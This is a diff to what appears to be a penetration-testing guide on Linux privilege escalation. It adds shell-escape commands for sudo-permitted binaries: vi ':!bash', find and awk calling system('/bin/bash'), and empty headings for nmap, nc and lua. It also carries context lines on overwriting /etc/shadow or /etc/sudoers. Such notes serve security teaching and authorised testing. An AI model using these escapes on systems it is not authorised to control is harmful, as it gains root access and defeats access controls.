@@ -102,11 +102,14 @@ The text/binary-editor HT running as sudo
 
 **nano**
 
-**vi**
+**vi/vim**
 With vi it is even easier. Just open vi
 ```
 sudo vi
 :shell
+
+:set shell=/bin/bash:shell	
+:!bash
 ```
 And you have shell.
 
@@ -135,6 +138,8 @@ Overwrite /etc/shadow or /etc/sudoers
 
 ```
 sudo find / -exec bash -i \;
+
+find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ; 
 ```
 
 **python/perl/ruby/lua/etc**
@@ -150,6 +155,32 @@ sudo python
 import os
 os.system("/bin/bash")
 ```
+
+**nmap**
+
+**awk**
+
+```
+awk 'BEGIN {system("/bin/bash")}'
+```
+
+**bash**
+
+**sh**
+
+**man**
+
+**nc**
+
+**netcat**
+
+**ruby**
+
+**lua**
+
+**irb** 
+
+
 
 ### Software vulnerabilites
 
